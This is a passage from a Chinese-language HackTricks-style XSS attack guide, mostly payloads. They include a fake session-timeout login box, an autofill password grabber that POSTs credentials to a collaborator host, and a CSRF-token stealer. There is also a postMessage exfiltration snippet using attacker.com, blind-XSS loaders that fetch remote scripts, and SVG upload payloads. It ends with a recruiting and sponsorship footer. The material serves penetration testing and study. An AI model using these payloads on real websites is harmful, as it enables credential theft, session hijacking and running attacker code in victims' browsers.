console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```

_短时间表示有响应的端口_ _较长时间表示无响应。_

查看Chrome中禁止的端口列表[**这里**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc)，以及Firefox中的[**这里**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)。

### 用于请求凭据的框

```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```

### 自动填充密码捕获

```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

当在密码字段中输入任何数据时，用户名和密码将被发送到攻击者的服务器，即使客户端选择了保存的密码并且没有输入任何内容，凭据也将被外泄。

### 键盘记录器

仅在 GitHub 上搜索，我找到了一些不同的：

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* 您还可以使用 metasploit `http_javascript_keylogger`

### 窃取 CSRF 令牌

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### 窃取 PostMessage 消息

* 在目标网站上注入恶意脚本，以便窃取通过 PostMessage 传递的敏感信息。
* 使用恶意脚本监听 `message` 事件，并将接收到的消息发送到攻击者控制的服务器。

```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```

### 滥用 Service Workers

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### 访问 Shadow DOM

{% content-ref url="shadow-dom.md" %}
[shadow-dom.md](shadow-dom.md)
{% endcontent-ref %}

### Polyglots

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### 盲 XSS 负载

您也可以使用：[https://xsshunter.com/](https://xsshunter.com)

```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

### 正则表达式 - 访问隐藏内容

从[**这篇文章**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)中可以了解到，即使某些值从 JS 中消失了，仍然可以在不同对象的 JS 属性中找到它们。例如，即使正则表达式的输入值被删除，仍然可以在正则表达式的输入值中找到它。

```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```

### 暴力破解列表

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## 利用其他漏洞的 XSS

### Markdown 中的 XSS

可以注入 Markdown 代码来渲染吗？也许你可以获得 XSS！检查：

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS 到 SSRF

在**使用缓存的网站**上获得 XSS？尝试使用以下负载将其**升级为 SSRF**，通过边缘包含注入（Edge Side Include Injection）：

```python
<esi:include src="http://yoursite.com/capture" />
```

用它来绕过cookie限制、XSS过滤器等等！\
有关此技术的更多信息，请参阅：[**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)。

### 动态创建PDF中的XSS

如果一个网页正在使用用户控制的输入创建PDF，您可以尝试**欺骗**创建PDF的**机器人**以**执行任意JS代码**。\
因此，如果**PDF创建机器人发现**某种**HTML标签**，它将**解释**它们，您可以**滥用**这种行为来引发**服务器XSS**。

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

如果无法注入HTML标签，可以尝试**注入PDF数据**：

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### 在Amp4Email中的XSS

AMP旨在加速移动设备上的网页性能，结合了HTML标签和JavaScript，以确保功能性，并强调速度和安全性。它支持各种功能的一系列组件，可通过[AMP组件](https://amp.dev/documentation/components/?format=websites)访问。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/)格式将特定AMP组件扩展到电子邮件，使收件人能够直接在其电子邮件中与内容交互。

示例[**Gmail中Amp4Email中的XSS写作**](https://adico.me/post/xss-in-gmail-s-amp4email)。

### 上传文件中的XSS（svg）

将以下文件作为图像上传（来自[http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）：

```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```

在[https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)中查找**更多SVG有效载荷**

## 其他JS技巧和相关信息

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSS资源

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果您对**黑客职业**感兴趣并想要攻破不可能的 - **我们正在招聘！**（需要流利的波兰语书面和口头表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
